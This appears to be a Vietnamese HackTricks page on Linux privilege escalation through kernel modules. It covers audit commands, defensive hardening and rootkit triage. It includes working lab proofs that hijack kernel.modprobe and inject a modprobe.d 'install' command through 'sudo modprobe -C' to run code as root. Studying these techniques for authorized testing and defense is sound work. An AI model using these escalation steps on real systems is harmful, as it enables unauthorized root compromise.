# Lạm dụng Kernel Modules và modprobe

{{#include ../../banners/hacktricks-training.md}}

## Cấu hình sai kernel module và quá trình tải module

Hỗ trợ kernel module là một khu vực có tác động lớn khi rà soát privilege escalation trên Linux. Đừng mặc định mọi thông báo về module chưa ký đều có thể khai thác được; hãy dùng chúng để trả lời các câu hỏi thực tế.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Người dùng hiện tại có thể tải module thông qua `sudo`, capabilities hoặc một đường dẫn helper có quyền ghi không?
- Tính năng tải module vẫn được bật chứ?
- Tính năng thực thi chữ ký module có bị tắt không?
- Có thể ghi vào các thư mục module, tệp module hoặc đường dẫn cấu hình `modprobe.d` không?<sup>[[16]](#references)</sup>
- Có thể đọc nhật ký kernel để xác nhận những gì đã xảy ra không?

Việc kiểm tra nhanh bắt đầu bằng các bước kiểm tra trạng thái module, chữ ký, nhật ký và cây thư mục module sau đây.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Diễn giải:

- `modules_disabled=1` nghĩa là không thể nạp hoặc gỡ module, và giá trị này không thể đặt lại thành `0` cho đến khi khởi động lại.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` trên dòng lệnh kernel hoặc `CONFIG_MODULE_SIG_FORCE=y` yêu cầu module phải có chữ ký hợp lệ; nếu không, module chưa ký có thể được nạp và khiến kernel bị đánh dấu.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` không áp đặt hạn chế nào lên `dmesg`; khi giá trị này là `1`, cần có `CAP_SYSLOG` để truy cập.<sup>[[1]](#references)</sup>
- Các đường dẫn có quyền ghi trong `/lib/modules/$(uname -r)/` rất nguy hiểm vì `modprobe` tìm kiếm trong cây thư mục đó và dữ liệu phụ thuộc của nó khi nạp module.<sup>[[8]](#references)</sup>

### Nạp module và đọc đầu ra của kernel

Nếu bạn được phép hợp lệ để nạp một module cục bộ, `insmod` sẽ chèn chính xác tệp `.ko` mà bạn cung cấp. Hàm init của module chạy trong quá trình nạp, và các thông báo được ghi bằng `printk()` sẽ được đưa vào bộ đệm nhật ký kernel, thường được đọc bằng `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Quy trình rà soát cơ bản sử dụng `modinfo` để kiểm tra metadata, `insmod` và `rmmod` để nạp và gỡ module, `lsmod` để xác nhận trạng thái đã nạp, và `dmesg` để kiểm tra nhật ký kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Nếu `sudo -l` cho phép chạy `insmod`, `modprobe` hoặc một wrapper bao quanh chúng, hãy xem đây là vấn đề nghiêm trọng: `sudo -l` liệt kê các quyền của người dùng gọi lệnh, còn việc tải kernel module yêu cầu `CAP_SYS_MODULE`. Xem [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) để biết các hướng khai thác trực tiếp dựa trên capability.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` được sudo cho phép

Quy tắc sudo cho phép người dùng chạy `insmod` không tương đương với việc cho phép sử dụng một công cụ hỗ trợ quản trị thông thường. Mã khởi tạo của module chạy trong quá trình nạp, vì vậy câu hỏi thực tế khi đánh giá là liệu người dùng này có thể chọn hoặc sửa đổi module được nạp hay không.<sup>[[3]](#references)</sup>

Quy trình đánh giá chung sau đây lặp lại các bước kiểm tra, nạp, trạng thái, nhật ký và gỡ bỏ đối với một module ứng viên.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Nếu người dùng có thể cung cấp một tệp `.ko` tùy ý, trong một cuộc đánh giá được cấp phép, hãy xem đây là trường hợp xâm phạm toàn bộ hệ thống. Một phương án vận hành an toàn hơn là không ủy quyền việc tải module thông qua sudo; nếu không thể tránh được, hãy giới hạn chính xác đường dẫn, chủ sở hữu, quyền truy cập, chính sách ký và quy trình gỡ bỏ.<sup>[[3]](#references)[[10]](#references)</sup>

Bên dưới là mã nguồn tối thiểu và Makefile minh họa một cách xây dựng module vô hại trong phòng lab được kiểm soát; cú pháp `make -C /lib/modules/$(uname -r)/build M=$PWD` tuân theo quy trình kbuild được tài liệu hóa của kernel để xây dựng các module bên ngoài.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Chỉ build và nạp trong phòng lab được ủy quyền; kbuild dùng để build module bên ngoài, còn các lệnh nạp/gỡ gọi đến các giao diện module kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Kiểm tra lạm dụng `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` chỉ định helper userspace mà kernel thực thi khi có yêu cầu tự động tải module; sysctl này ảnh hưởng đến việc tự động tải, không ảnh hưởng đến việc chèn module tường minh. Nếu attacker có thể đổi giá trị này thành đường dẫn đến tệp thực thi có quyền ghi và kích hoạt yêu cầu module, helper đó sẽ trở thành một đường dẫn thực thi mã với quyền cao. Đặt giá trị thành chuỗi rỗng sẽ vô hiệu hóa các yêu cầu tự động tải; nếu `CONFIG_STATIC_USERMODEHELPER=y`, giá trị không rỗng sẽ bị ghi đè bằng đường dẫn helper tĩnh được biên dịch sẵn.<sup>[[1]](#references)</sup>

Kiểm tra đường dẫn helper hiện tại qua giao diện sysctl của kernel và xem chủ sở hữu cùng quyền truy cập của đích đó.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Kiểm tra xem có thể tác động đến sysctl, các quy tắc sudo được ủy quyền hoặc capabilities của tệp hay không.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Mẫu chỉ dành cho lab sau đây thay đổi đường dẫn helper và kích hoạt một yêu cầu module-autoload đã được ghi nhận; chỉ sử dụng mẫu này trên hệ thống cô lập và được cấp phép.<sup>[[1]](#references)</sup>

Trên các kernel Linux hiện tại, không dùng một executable không xác định làm trigger chung: cơ chế tự động nạp module cho định dạng binary tùy chỉnh kiểu cũ đã bị loại bỏ trong Linux 6.14, trong khi tài liệu kernel xác định filesystem type không xác định là một đường dẫn yêu cầu module-autoload.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Trên các hệ thống được harden, thao tác này sẽ thất bại khi quyền không cho phép người dùng không có đặc quyền ghi vào `kernel.modprobe`, đường dẫn helper không có quyền ghi hoặc tính năng tự động tải module bị tắt.<sup>[[1]](#references)</sup>

### Cấu hình `modprobe.d` có quyền ghi và `sudo modprobe -C`

Trước khi phân giải một module, `modprobe` đọc các tệp `.conf` từ những thư mục cấu hình như `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` và `/lib/modprobe.d`, theo thứ tự ưu tiên. Tệp cùng tên trong thư mục có mức ưu tiên cao hơn sẽ che khuất tệp ở thư mục có mức ưu tiên thấp hơn. Quan trọng hơn, chỉ thị `install <module> <command>` chạy một lệnh shell bất kỳ **thay vì** chèn module đó. Vì vậy, một đường dẫn cấu hình có quyền ghi có thể trở thành điểm thực thi lệnh trì hoãn dưới quyền của người dùng gọi `modprobe` với đặc quyền vào thời điểm sau; cơ chế thực thi chữ ký module của kernel không xác thực lệnh userspace này.<sup>[[16]](#references)</sup>

Kiểm tra quyền của thư mục và tệp, sau đó xem cấu hình thực tế đang có hiệu lực. `modprobe -n -v` an toàn để rà soát quá trình phân giải vì chế độ dry-run không chèn module cũng không thực thi lệnh `install`/`remove`. Nên dùng `modprobe -c` thay cho cách viết cũ `--showconfig`, vốn được tài liệu kmod hiện tại đánh dấu sẽ bị loại bỏ sau kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Một quy tắc sudo không hạn chế cho `modprobe` vẫn có thể bị khai thác ngay cả khi các tệp `.ko` tùy ý không vượt qua được bước xác minh chữ ký: `-C` chọn một thư mục cấu hình do kẻ tấn công kiểm soát, từ đó tiến trình được sudo khởi chạy có thể thực thi lệnh `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Để giảm thiểu rủi ro, không cấp quyền chạy `modprobe` với đối số không bị giới hạn thông qua sudo, đảm bảo mọi thư mục cấu hình đều thuộc sở hữu của root và không thể ghi, đồng thời rà soát các chỉ thị `install`/`remove` bất thường. Khi quy trình quản trị đáng tin cậy cần bỏ qua các chỉ thị như vậy cho một module, `modprobe --ignore-install` sẽ bỏ qua chúng đối với module được chỉ định, nhưng các dependency vẫn có thể có lệnh riêng.<sup>[[8]](#references)[[16]](#references)</sup>

### Rà soát `/lib/modules` có quyền ghi

Các thư mục module có quyền ghi có thể cho phép thay thế module, cài cắm module độc hại hoặc lạm dụng cơ chế tự động tải, tùy thuộc vào cách `modprobe` được gọi sau đó; `modprobe` tìm kiếm trong `/lib/modules/$(uname -r)` và sử dụng dữ liệu dependency tại đó khi phân giải module.<sup>[[8]](#references)</sup>

Rà soát các tệp module có quyền ghi cùng metadata dependency/alias trong cây module của phiên bản kernel đang hoạt động.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Nếu tìm thấy nội dung module có thể ghi, hãy kiểm tra cách `modprobe` phân giải các dependency và cách `modinfo` báo cáo metadata của module.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Ghi chú phòng thủ:

- Giữ `/lib/modules` thuộc sở hữu của `root:root` và không cho người dùng ghi.<sup>[[8]](#references)</sup>
- Đặt `kernel.modules_disabled=1` sau khi khởi động nếu có thể thực hiện về mặt vận hành.<sup>[[1]](#references)</sup>
- Bắt buộc ký module trên các hệ thống cần nạp module.<sup>[[2]](#references)</sup>
- Giám sát các lần ghi vào `/proc/sys/kernel/modprobe`, `/lib/modules` và các thư mục cấu hình `modprobe.d`, đồng thời theo dõi việc thực thi `insmod`/`modprobe` bất thường.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Phân loại rootkit dựa trên module

Module độc hại có thể móc nối syscall, các chế độ xem VFS hoặc `/proc`, đường dẫn mạng hoặc các bước kiểm tra thông tin xác thực để ẩn tiến trình và tệp, chuyển hướng lưu lượng hoặc chặn thông tin bí mật. Nó cũng có thể tự xóa khỏi danh sách module mà `lsmod` hiển thị. Cơ chế duy trì có thể dựa vào bí danh hoặc quy tắc cài đặt trong `modprobe.d`, `/etc/modules-load.d`, một đơn vị systemd, nội dung initramfs hoặc việc thay thế một tệp `.ko` hợp lệ. Kết quả `lsmod` bình thường là bằng chứng hữu ích, nhưng sự xâm phạm ở cấp kernel có thể khiến các danh sách do kernel cung cấp không đáng tin cậy. Hãy đối chiếu các module đã nạp, tệp trên đĩa, cấu hình khởi động, nhật ký nạp module và dữ liệu đo từ xa bên ngoài đáng tin cậy.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Xem xét các tên module, đường dẫn, dependency, chữ ký và thời điểm tải bất thường. Thông báo kernel taint và module chưa ký là manh mối, không phải bằng chứng về rootkit. Nếu nghi ngờ có rootkit, hãy thu thập bằng chứng từ image đáng tin cậy hoặc môi trường khôi phục trước khi dựa vào đầu ra kernel trực tiếp. Trang [đánh giá lỗ hổng kernel](kernel-vulnerability-assessment.md) đề cập đến cấu hình và khả năng lộ thông tin chẩn đoán, bao gồm tracefs và các đối tượng BPF được ghim.

## References

- [1] [Tài liệu về /proc/sys/kernel/ — Tài liệu nhân Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Cơ chế ký module kernel — Tài liệu nhân Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Kiến thức cơ bản về driver — Tài liệu nhân Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Ghi nhật ký thông báo bằng printk — Tài liệu nhân Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Biên dịch module bên ngoài — Tài liệu nhân Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Gộp tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
